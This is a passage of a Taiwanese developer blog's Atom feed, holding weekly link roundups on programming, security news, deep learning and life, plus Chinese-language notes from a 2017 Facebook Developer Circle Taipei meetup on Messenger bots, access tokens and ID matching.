&lt;li&gt;英語和美語的差異呢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/jeffchiafuchang/posts/1329685480388817:0"&gt;張家福 Jeff Chang - Posts&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;厭世的英文： misanthrope  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://pcmanx.blogspot.tw/2017/06/2017-06.html"&gt;PCMan's Blog: 2017-06 香港自由行 - 行程分享&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;三天寫的如此詳細...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;book&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@jhihsianwu/%E6%8C%91%E6%88%B0%E4%B8%8D%E5%8F%AF%E8%83%BD-%E6%AF%94nasa%E6%9B%B4%E6%8E%A5%E8%BF%91%E5%A4%AA%E7%A9%BA%E7%9A%84%E5%B0%8F%E9%8E%AE%E5%B7%A5%E5%BB%A0-%E9%96%B1%E8%AE%80%E5%BF%83%E5%BE%97-d03d83c17cc8?source=rss-e187bf7c71f------2"&gt;《挑戰不可能！比NASA更接近太空的小鎮工廠》閱讀心得 – Jhih-Sian Wu – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;沒記錯應該是《下町火箭》的原型？有空好像該來看一下  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="book"></category><category term="devops"></category><category term="flask"></category><category term="gcp"></category><category term="git"></category><category term="life"></category><category term="misc"></category><category term="programming"></category><category term="python"></category><category term="taiwan"></category><category term="trivia"></category></entry><entry><title>Facebook Developer Circle: Taipei - Meetup #2</title><link href="https://blog.m157q.tw/posts/2017/06/22/facebook-developer-circle-taipei-meetup-2/" rel="alternate"></link><published>2017-06-22T21:41:20+08:00</published><updated>2017-06-22T21:41:20+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-06-22:posts/2017/06/22/facebook-developer-circle-taipei-meetup-2/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;Event Link: &lt;a href="https://fdctaipei.kktix.cc/events/fdc201706"&gt;https://fdctaipei.kktix.cc/events/fdc201706&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Facebook Messenger Platform 現況&lt;/h2&gt;
&lt;p&gt;Speaker: Sean Liu (urAD co-founder)  &lt;/p&gt;
&lt;h3&gt;Agenda&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;為什麼我要做 Bot 相關產品  &lt;/li&gt;
&lt;li&gt;NLP 的理想與現實  &lt;/li&gt;
&lt;li&gt;Facebook Messenger Platform 發展方向的一些轉折  &lt;/li&gt;
&lt;li&gt;Bot 的管理實務  &lt;/li&gt;
&lt;li&gt;ID Matching  &lt;/li&gt;
&lt;li&gt;Bot 與 Ad-Tech  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Why Messenger Platform?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;下載 App 的人愈來愈少  &lt;/li&gt;
&lt;li&gt;App 的市場都集中在超級大的 App 上  &lt;/li&gt;
&lt;li&gt;Messenger Bot 可以利用既有的社交圖譜  &lt;/li&gt;
&lt;li&gt;一鍵式 Payment  &lt;/li&gt;
&lt;li&gt;微信是非常好的成功案例  &lt;ul&gt;
&lt;li&gt;微信 Bot: 微信公眾好  &lt;/li&gt;
&lt;li&gt;微信小程序  &lt;/li&gt;
&lt;li&gt;創造出了依附在社交圈的龐大經濟體系  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bot 能接觸到我們過往所無法接觸到的私密對話  &lt;ul&gt;
&lt;li&gt;人們在使用對話的時候與其平常在網路上的行為是更真實的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但是，Bot 如何創造價值  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;NLP 的理想與現實&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;urAD 和 ChocoLab 合作開發的 CHOCO TV BOT  &lt;ul&gt;
&lt;li&gt;花了很多時間在制定彼此之間的 API 格式  &lt;/li&gt;
&lt;li&gt;需要從 CHOCO LAB 的 API 拿到影劇和演員的資料建立 Entity  &lt;/li&gt;
&lt;li&gt;影劇的別名，例如：冰與火之歌 == 權力的遊戲  &lt;/li&gt;
&lt;li&gt;劇名、季數、集數  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;現實是你根本無法預期使用者會怎麼跟 Bot 對話，使用者也根本不在乎，常常都會出現 Bot 無法理解的語句，毫無規則可言。  &lt;/li&gt;
&lt;li&gt;資料的整理梳理和 NLP 的分詞斷句花了不少時間  &lt;/li&gt;
&lt;li&gt;Bot vs Google Search?  &lt;ul&gt;
&lt;li&gt;做的要死要活的還不如拿去 Google Search 請它幫你？  &lt;/li&gt;
&lt;li&gt;想找尋某個特定的場景劇情發生時是在哪一集  &lt;ul&gt;
&lt;li&gt;可以把截圖抓出來  &lt;/li&gt;
&lt;li&gt;NLP 分析使用者的問句  &lt;/li&gt;
&lt;li&gt;把影片中的每個 frame 用 ffmpeg 抓出來，丟到 Google Cloud Vision 或 IBM Watson 認出截圖中的 objects，再去建 index。（但建一部影片的 index 的成本極高）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NLP 和 ML 不是黑魔法  &lt;ul&gt;
&lt;li&gt;必須要花時間建立 entity 和 &lt;a href="https://en.wikipedia.org/wiki/Utterance"&gt;utterance&lt;/a&gt; 並不時修正補強  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Context （對話脈絡）  &lt;ul&gt;
&lt;li&gt;使用者要找某部作品  &lt;/li&gt;
&lt;li&gt;又問了這部劇的演員還演過哪齣劇  &lt;/li&gt;
&lt;li&gt;又問了這部劇的平均收視率是多少  &lt;/li&gt;
&lt;li&gt;Bot 只能回答第一個問題，因為它並不像人一樣預設就可以記住上文的東西 (Context free?)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;api.ai, wit.ai, IBM Watson NLP api 有提供前後文關聯的機制  &lt;ul&gt;
&lt;li&gt;會幫你去尋找之前的問句的 Entity  &lt;/li&gt;
&lt;li&gt;但當 intent 的數量太多的時候，會遇到問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Facebook Messenger Platform 發展方向的一些轉折&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Quick reply  &lt;/li&gt;
&lt;li&gt;Persistent menu 從 5 個改成 3x5x5 個 menu  &lt;/li&gt;
&lt;li&gt;Composer Drawer  &lt;ul&gt;
&lt;li&gt;Messenger 對話欄輸入框最左邊的 + 號 (邊緣人調查 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Chat Extensions  &lt;/li&gt;
&lt;li&gt;小結： AI 還太遙遠，WebView 優先。  &lt;ul&gt;
&lt;li&gt;在真的願意花時間和成本去解決 NLP 和 ML 的資料訓練以前，必須要一段不短的時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Bot 的管理實務&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;和接下來講的 Business Manager 和 ID Matching 有點關係  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Tokens&lt;/h4&gt;
&lt;p&gt;Facebook User 不盡然等於 Messenger User  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;User Access Token  &lt;ul&gt;
&lt;li&gt;使用者透過 OAuth 去授權你的 Facebook App 後所取得的 Access Token  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Page Access Token  &lt;ul&gt;
&lt;li&gt;透過 User Access Token 取得 User 的 Facebook 帳號下，擁有管理 Page 權限的 Access Token。  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;這串到底是在工三小 XDDDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;App Access Token  &lt;/li&gt;
&lt;li&gt;System User Access Token  &lt;/li&gt;
&lt;li&gt;Admin System User Access Token  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ID Matching&lt;/h3&gt;
&lt;p&gt;Global User ID vs ASID vs PSID  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;萬惡的層層 ID 限制 XD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;ASID: App-Scoped ID  &lt;/li&gt;
&lt;li&gt;PSID: Page-Scoped ID  &lt;ul&gt;
&lt;li&gt;使用者與某個 Bot 互動後，該 Bot 所獲得代表該名使用者的 ID  &lt;/li&gt;
&lt;li&gt;只有在該 Bot 有效  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ASID 可以重新在 Facebook 上找到使用者，但 PSID 不行  &lt;ul&gt;
&lt;li&gt;透過 Facebook Graph API 用 ASID 去找到該名使用者  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Messenger Bot Platform 2.0 推出的 ID Matching  &lt;ul&gt;
&lt;li&gt;讓開發者可以透過 PSID 找到該名使用者的 ASID  &lt;/li&gt;
&lt;li&gt;讓開發者可以拿到使用者的資料回去 Messenger Bot，強化 CRM (Customer Relationship Management)  &lt;/li&gt;
&lt;li&gt;對企業很重要，因為可以拿來做廣告 XDDD  &lt;ul&gt;
&lt;li&gt;可以餵 ASID 和 PSID 來投放廣告  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ID Matching 是完全開放的 API 但有些嚴苛的限制  &lt;ul&gt;
&lt;li&gt;必須要 App 和 Bot 都歸在同個 Business Manager 底下才能作用  &lt;/li&gt;
&lt;li&gt;Secret Proof 必須要用到 App Access Token，而 Secret Proof 是必須要帶在 ID Matching request 的 Payload 裡面的。  &lt;/li&gt;
&lt;li&gt;一定兩個都要是 owner 嗎？還是說只要是有被分享就可以？  &lt;/li&gt;
&lt;li&gt;一個 BM 目前可以建 10 個 System User 和一個 System Admin User  &lt;/li&gt;
&lt;li&gt;System User 可以不用是一個真的人，有點像是資源歸類的角色。  &lt;/li&gt;
&lt;li&gt;強烈建議把 Bot 和 Page 的管理都放在 BM 底下，而不是某個 User。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;快速上手 Messenger API 輕鬆打造自己的智能客服&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: Ian Lin (Chatisfy CTO)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Messenger API 能做什麼？&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;比較具有代表性的 Chat Bot  &lt;ul&gt;
&lt;li&gt;eBay ShopBot  &lt;ul&gt;
&lt;li&gt;可以透過文字輸入和圖片上傳找到商品  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Madison Reed  &lt;ul&gt;
&lt;li&gt;用問題引導的方式，理解客戶的需求並推薦適合的染髮劑，點選商品就會引到進入官網購買。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;台鐵時刻通  &lt;ul&gt;
&lt;li&gt;輸入起迄點就會答覆最近時刻班次、票價和火車動態，也可以直接線上訂票（用 WebView 開啟台鐵訂票網頁）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Her/Him  &lt;ul&gt;
&lt;li&gt;隨機找陌生人聊天，還能推薦你聊天話題，在雙方同意情況下可以交換 Facebook  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;要如何開始建立聊天機器人？&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;建立 Facebook App 和粉絲專頁  &lt;/li&gt;
&lt;li&gt;設定 Webhook  &lt;ul&gt;
&lt;li&gt;欄位設定  &lt;ul&gt;
&lt;li&gt;回呼網址  &lt;/li&gt;
&lt;li&gt;驗證權杖  &lt;/li&gt;
&lt;li&gt;訂閱欄位  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Messaging Referral  &lt;ul&gt;
&lt;li&gt;m.me  &lt;/li&gt;
&lt;li&gt;?ref=xxx  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;取得粉絲專頁的 Access Token  &lt;/li&gt;
&lt;li&gt;粉絲團訂閱應用程式  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;有什麼方法可以更快速建立聊天機器人嗎？&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Chatisfy （偷打廣告 XD 雖然有用過是真的還不錯用就是了  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;從 0 到 20000 MAU&lt;/h2&gt;
&lt;p&gt;Speaker: Howard Chang  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;「嗨，大家好，我是 Her/Him, Her/Her, Him/Him 開發者，因為太長，所以我都簡稱 H/H 開發者。」  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;XDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「剛剛看了一下，已經到 25000 MAU 了。」  &lt;/li&gt;
&lt;li&gt;「媒體帶來的是大量的曝光但幾乎都不是有真正交友需求的受眾，都是那些會看科技新聞的人，就像在座的各位。」  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;靠北 XDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「上個禮拜辦了個叫作『拉拉網路獵愛』的線下聚會，會後她們討論交過幾個女朋友的單位是用『打』在算的，聽到都跪在地上了。」  &lt;/li&gt;
&lt;li&gt;用什麼工具來計算 Messenger Bot 的使用者流量  &lt;ul&gt;
&lt;li&gt;Google Analytics  &lt;ul&gt;
&lt;li&gt;比較難應用，但還是有埋  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Botmize  &lt;ul&gt;
&lt;li&gt;針對中文有做些斷句斷詞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dashbot  &lt;ul&gt;
&lt;li&gt;全球最大的 Chat Bot 分析工具  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Botmetrics  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Facebook"></category><category term="Meetup"></category></entry><entry><title>Y2017W24</title><link href="https://blog.m157q.tw/posts/2017/06/19/y2017w24/" rel="alternate"></link><published>2017-08-28T22:08:39+08:00</published><updated>2017-08-28T22:08:39+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-06-19:posts/2017/06/19/y2017w24/</id><summary type="html">&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.reddit.com/r/unix/comments/6gxduc/how_is_gnu_yes_so_fast/"&gt;How is GNU &lt;code&gt;yes&lt;/code&gt; so fast? : unix&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;etherum&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/taipei-ethereum-meetup/%E9%96%80%E5%A4%96%E6%BC%A2%E5%88%9D%E6%8E%A2%E4%BB%A5%E5%A4%AA%E5%9D%8A-ethereum-c425c1470151?source=rss-e187bf7c71f------2"&gt;新手初探以太坊（Ethereum） – Taipei Ethereum Meetup – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;整理挺多資訊的  &lt;/li&gt;
&lt;li&gt;加減看  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;git&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/5120038/is-it-possible-to-cherry-pick-a-commit-from-another-git-repository"&gt;Is it possible to cherry-pick a commit from another git repository? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/12320863/how-do-you-take-a-git-diff-file-and-apply-it-to-a-local-branch-that-is-a-copy-o"&gt;How do you take a git diff file, and apply it to a local branch that is a copy of the same repository? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/a/9507417"&gt;https://stackoverflow.com/a/9507417&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;git formatpatch&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;git am&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;productivity&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.gitbook.com/book/jhargrave/mind-hacking/details"&gt;Mind Hacking · GitBook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;JOIN THE MIND HACKING MOVEMENT.  Mind Hacking teaches you how to reprogram your thinking -- like reprogramming a computer -- to give you increased mental efficiency and happiness. The entire book is available here for free:Click here to start reading Mind Hacking.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.blog/2017/06/15/developers-use-spaces-make-money-use-tabs/"&gt;Developers Who Use Spaces Make More Money Than Those Who Use Tabs - Stack Overflow Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Do you use tabs or spaces for code indentation?  This is a bit of a “holy war” among software developers; one that’s been the subject of many debates and in-jokes. I use spaces, but I never thought it was particularly important.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://chairco.github.io/2017Talk-Django-crawler-monitor/#cover"&gt;用 Django 建立一個可以設定爬蟲排程任務與監控的網站 — 2017 PyConTW Talk&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;公司與工廠間再生產產品期間時需要經常即時的傳遞零組件資料，這些資料存在品牌公司的資訊系統。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ithome.com.tw/news/114953"&gt;資安一週[0610-0616]：Facebook申請專利技術，暗中監控用戶功能來強化臉書服務 | iThome&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Facebook早在2015年已經申請一項專利技術，利用行動裝置攝影機暗中捕捉用戶表情，強化發文功能。之後，2016、2017年也利用盜錄用戶鍵盤打字、滑鼠移動和觸碰螢幕紀錄，預測用戶情緒。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.cbinsights.com/blog/facebook-emotion-patents-analysis/"&gt;Facebook’s Emotion Tech: Patent Filings Show New Ways To Monitor Your Feelings&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;真的是各種厲害到讓人有點害怕的手段呢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;testing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://dev.to/milipski/test-doubles---fakes-mocks-and-stubs"&gt;Test Doubles - Fakes, Mocks and Stubs.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;很棒的一篇關於軟體測試裡頭這三種名詞差別的介紹文  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://facebook.tracking.exposed"&gt;facebook tracking exposed&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://twitter.com/Ellaeon/status/875017007699173379"&gt;Pellaeon Lin on Twitter: "https://t.co/fIUCbf9H7q&lt;br /&gt;
這計劃太有趣啦！試圖透過瀏覽器插件收集 FB 使用者的牆上會看到的公開貼文，傳回中央伺服器，結合多人收集到的資料，試圖逆向出臉書的newsfeed演算法，看臉書如何決定使用者看到的資訊。&lt;br /&gt;
資料已經被拿來分析荷蘭和法國大選，太酷啦！"&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ventureharbour.com/improving-site-speed/"&gt;How to Improve Your Page Load Speed by 70.39% in 45 Minutes&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.thenewslens.com/article/70491"&gt;也請記得陳冠齊，一個熱愛土地、用鏡頭記錄台灣的25歲青年 - The News Lens 關鍵評論網&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.twreporter.org/a/software-microsoft-tw-government"&gt;自願被微軟綁架的台灣政府 - 報導者 The Reporter&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;對許多台灣人來說，文書軟體就等於Word，簡報軟體就等於PowerPoint，幾乎沒有微軟產品以外的想像。但事實上，除了微軟的產品以外，我們還有LibreOffice、OpenOffice等辦公軟體的選擇，但為何不論是人民或是政府，都  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@jhihsianwu/%E9%97%9C%E6%96%BC%E5%96%80%E4%BB%80%E7%B1%B3%E7%88%BE%E7%BE%8A%E6%AF%9B-a9af95a7c0df?source=rss-e187bf7c71f------2"&gt;關於喀什米爾羊毛 – Jhih-Sian Wu – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「山羊在天冷的時候身體自然長出用來抵禦寒冷，而天熱時慢慢退掉的絨叫做羊絨。」  &lt;/li&gt;
&lt;li&gt;「羊絨的保暖程度是羊毛的八倍，重量只有羊毛的五分之一。」  &lt;/li&gt;
&lt;li&gt;「羊絨只有山羊才有，綿羊沒有。」  &lt;/li&gt;
&lt;li&gt;長知識了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="cli"></category><category term="etherum"></category><category term="git"></category><category term="life"></category><category term="productivity"></category><category term="programmer"></category><category term="python"></category><category term="security"></category><category term="taiwan"></category><category term="testing"></category><category term="web"></category></entry><entry><title>Y2017W23</title><link href="https://blog.m157q.tw/posts/2017/06/12/y2017w23/" rel="alternate"></link><published>2017-08-28T22:01:17+08:00</published><updated>2017-08-28T22:01:17+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-06-12:posts/2017/06/12/y2017w23/</id><summary type="html">&lt;h3&gt;ai&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blogs.nvidia.com.tw/2016/07/whats-difference-artificial-intelligence-machine-learning-deep-learning-ai/"&gt;人工智慧、機器學習與深度學習間有什麼區別? | NVIDIA 台灣官方部落格&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;此為資深科技圈記者 Michael Copeland 撰文介紹深度學習基礎系列文章的首篇。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@kailashahirwar/essential-cheat-sheets-for-machine-learning-and-deep-learning-researchers-efb6a8ebd2e5"&gt;Essential Cheat Sheets for Machine Learning and Deep Learning Engineers&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Learning machine learning and deep learning is difficult for newbies. As well as deep learning libraries are difficult to understand. I am creating a repository on Github(cheatsheets-ai) with cheat sheets which I collected from different sources.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kailashahirwar/cheatsheets-ai"&gt;GitHub - kailashahirwar/cheatsheets-ai: Essential Cheat Sheets for deep learning and machine learning researchers&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/asiayo-engineering/%E5%9B%9B%E5%A4%A7-seo-%E5%85%A7%E5%8A%9F%E5%BF%83%E6%B3%95-%E8%AE%93%E6%88%91%E5%80%91%E7%9A%84-seo-%E6%B5%81%E9%87%8F%E7%88%86%E7%82%B8%E6%80%A7%E6%88%90%E9%95%B7-30-%E5%80%8D-c186f384f51a?source=rss-b909769294ad------2"&gt;四大 SEO 內功心法，讓我們的 SEO 流量爆炸性成長 30 倍 – AsiaYo Engineering – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;挺不錯的流量成長分享  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;database&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/tw/blogs/ai/tuning-your-dbms-automatically-with-machine-learning/"&gt;Tuning Your DBMS Automatically with Machine Learning | AWS AI Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This is a guest post by Dana Van Aken, Andy Pavlo, and Geoff Gordon of Carnegie Melon University. This project demonstrates how academic researchers can leverage our AWS Cloud Credits for Research Program to support their scientific breakthroughs.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;用機器學習自動調整 DBMS 的 config  &lt;/li&gt;
&lt;li&gt;而且效果跟人手動調的差不多  &lt;/li&gt;
&lt;li&gt;DBA 要失業了嗎...?  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://db.cs.cmu.edu/papers/2017/tuning-sigmod2017.pdf"&gt;tuning-sigmod2017.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/cmu-db/ottertune"&gt;cmu-db/ottertune: The automatic DBMS configuration tool&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;deep learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0"&gt;深度學習 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;深度學習（英語：deep learning）是機器學習領域中一系列試圖使用多重非線性變換對數據進行多層抽象的算法[1]。深度學習是機器學習中表征學習（英語：learning representation）方法的一類。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/tw_dsconf/ss-62245351"&gt;[DSC 2016] 系列活動：李宏毅 / 一天搞懂深度學習&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Koed00/django-q"&gt;Koed00/django-q: A multiprocessing distributed task queue for Django&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;PyCon TW 聽到的分享，好像不錯用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;k8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/hobby-kube/guide"&gt;hobby-kube/guide: Kubernetes clusters for the hobbyist.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This guide answers the question of how to setup and operate a fully functional, secure Kubernetes cluster on a cloud provider such as DigitalOcean or Scaleway.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;open source&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://opensourcesurvey.org/2017/"&gt;Open Source Survey&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;In collaboration with researchers from academia, industry, and the community, GitHub designed a survey to gather high quality and novel data on open source software development practices and communities.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
